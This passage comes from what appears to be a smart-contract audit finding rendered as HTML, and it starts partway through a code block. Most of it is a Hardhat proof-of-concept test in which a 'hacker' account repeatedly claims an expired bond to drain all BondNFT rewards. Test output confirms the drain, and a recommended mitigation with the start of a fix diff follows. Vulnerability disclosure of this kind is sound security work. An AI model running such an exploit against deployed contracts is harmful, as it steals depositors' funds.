class=\"mtk11\">send</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;evm_mine&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk3\">// bond2 - hacker</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lock</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hacker</span><span class=\"mtk1\">).</span><span class=\"mtk11\">lock</span><span class=\"mtk1\">(</span><span class=\"mtk12\">StableToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1000</span><span class=\"mtk1\">), </span><span class=\"mtk7\">10</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk3\">// bond3 - hacker</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lock</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hacker</span><span class=\"mtk1\">).</span><span class=\"mtk11\">lock</span><span class=\"mtk1\">(</span><span class=\"mtk12\">StableToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1000</span><span class=\"mtk1\">), </span><span class=\"mtk7\">100</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk11\">distribute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2100</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk3\">// Skip 10+ days, bond2 is expired</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">network</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">send</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;evm_increaseTime&quot;</span><span class=\"mtk1\">, [</span><span class=\"mtk7\">13</span><span class=\"mtk1\">*</span><span class=\"mtk7\">86400</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">network</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">send</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;evm_mine&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk11\">distribute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2100</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk3\">// check balances before hack</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">st</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getState</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">st</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equals</span><span class=\"mtk1\">(</span><span class=\"mtk12\">TotalRewards</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">st</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lock</span><span class=\"mtk1\">).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equals</span><span class=\"mtk1\">(</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk7\">3000</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">st</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hacker</span><span class=\"mtk1\">).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equals</span><span class=\"mtk1\">(</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">+</span><span class=\"mtk7\">700</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">st</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pending1</span><span class=\"mtk1\">).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">closeTo</span><span class=\"mtk1\">(</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk7\">3800</span><span class=\"mtk1\">+</span><span class=\"mtk7\">1000</span><span class=\"mtk1\">+</span><span class=\"mtk7\">1000</span><span class=\"mtk1\">), </span><span class=\"mtk12\">gwei</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">st</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pending2</span><span class=\"mtk1\">).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">closeTo</span><span class=\"mtk1\">(</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk7\">100</span><span class=\"mtk1\">), </span><span class=\"mtk12\">gwei</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">st</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pending3</span><span class=\"mtk1\">).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">closeTo</span><span class=\"mtk1\">(</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1000</span><span class=\"mtk1\">+</span><span class=\"mtk7\">1000</span><span class=\"mtk1\">), </span><span class=\"mtk12\">gwei</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk3\">// first claim of expired bond2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lock</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hacker</span><span class=\"mtk1\">).</span><span class=\"mtk11\">claim</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk12\">st</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getState</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">st</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">closeTo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">TotalRewards</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sub</span><span class=\"mtk1\">(</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk7\">100</span><span class=\"mtk1\">)), </span><span class=\"mtk12\">gwei</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">st</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hacker</span><span class=\"mtk1\">).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">closeTo</span><span class=\"mtk1\">(</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk7\">100</span><span class=\"mtk1\">+</span><span class=\"mtk7\">700</span><span class=\"mtk1\">), </span><span class=\"mtk12\">gwei</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">st</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pending1</span><span class=\"mtk1\">).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">gt</span><span class=\"mtk1\">(</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk7\">3800</span><span class=\"mtk1\">+</span><span class=\"mtk7\">1000</span><span class=\"mtk1\">+</span><span class=\"mtk7\">1000</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">st</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pending2</span><span class=\"mtk1\">).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">st</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pending3</span><span class=\"mtk1\">).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">gt</span><span class=\"mtk1\">(</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1000</span><span class=\"mtk1\">+</span><span class=\"mtk7\">1000</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk3\">// hack</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">remainReward</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">st</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pending3</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">st</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pending3</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (; </span><span class=\"mtk12\">remainReward</span><span class=\"mtk1\">.</span><span class=\"mtk11\">gt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pending3</span><span class=\"mtk1\">); </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk3\">// claim expired bond2 repeatedly</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lock</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hacker</span><span class=\"mtk1\">).</span><span class=\"mtk11\">claim</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk3\">// pending3 keeps increasing</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">pending3</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk11\">pending</span><span class=\"mtk1\">(</span><span class=\"mtk7\">3</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">`claim count: </span><span class=\"mtk4\">${</span><span class=\"mtk12\">i</span><span class=\"mtk4\">}</span><span class=\"mtk6\">\\n</span><span class=\"mtk8\">remain: </span><span class=\"mtk4\">${</span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">formatEther</span><span class=\"mtk1\">(</span><span class=\"mtk12\">remainReward</span><span class=\"mtk1\">)</span><span class=\"mtk4\">}</span><span class=\"mtk6\">\\n</span><span class=\"mtk8\">pending3: </span><span class=\"mtk4\">${</span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">formatEther</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pending3</span><span class=\"mtk1\">)</span><span class=\"mtk4\">}</span><span class=\"mtk6\">\\n</span><span class=\"mtk8\">`</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk3\">// send diff, then drain rewards in bond</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hacker</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">pending3</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sub</span><span class=\"mtk1\">(</span><span class=\"mtk12\">remainReward</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lock</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hacker</span><span class=\"mtk1\">).</span><span class=\"mtk11\">claim</span><span class=\"mtk1\">(</span><span class=\"mtk7\">3</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk12\">st</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getState</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk3\">// !! bond is drained !!</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">st</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk3\">// !! hacker gets all rewards !!</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">st</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hacker</span><span class=\"mtk1\">).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">TotalRewards</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk7\">700</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">st</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pending1</span><span class=\"mtk1\">).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">gt</span><span class=\"mtk1\">(</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk7\">3800</span><span class=\"mtk1\">+</span><span class=\"mtk7\">1000</span><span class=\"mtk1\">+</span><span class=\"mtk7\">1000</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">st</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pending2</span><span class=\"mtk1\">).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">st</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pending3</span><span class=\"mtk1\">).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk11\">describe</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Withdrawing&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Only expired bonds can be withdrawn&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mintFor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;100&quot;</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p>Output:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  Bonds</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Rewards</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">claim count: 41</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">remain: 7900.000000000000000002</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">pending3: 8055.7342616570405578</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      ✓ Drain BondNFT rewards</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  1 passing (4s)</span></span></code></pre>\n<h3 id=\"tools-used-2\" style=\"position:relative;\"><a href=\"#tools-used-2\" aria-label=\"tools used 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code</p>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>I recommend that an expired bond should be forced to <code>release()</code>, <code>claim()</code> an expired bond should revert.</p>\n<p>Sample code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">diff</span><span class=\"mtk1\"> --</span><span class=\"mtk12\">git</span><span class=\"mtk1\"> </span><span class=\"mtk12\">a</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BondNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\"> </span><span class=\"mtk12\">b</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BondNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">index</span><span class=\"mtk1\"> 33</span><span class=\"mtk12\">a6e76</span><span class=\"mtk1\">..77</span><span class=\"mtk12\">e85ae</span><span class=\"mtk1\"> </span><span class=\"mtk7\">100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">--- </span><span class=\"mtk12\">a</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BondNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+++ </span><span class=\"mtk12\">b</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BondNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -</span><span class=\"mtk7\">148</span><span class=\"mtk1\">,</span><span class=\"mtk7\">7</span><span class=\"mtk1\"> +</span><span class=\"mtk7\">148</span><span class=\"mtk1\">,</span><span class=\"mtk7\">7</span><span class=\"mtk1\"> @@ </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">BondNFT</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC721Enumerable</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Ownable</span><span class=\"mtk1\"> {</span></span></span>\n<span 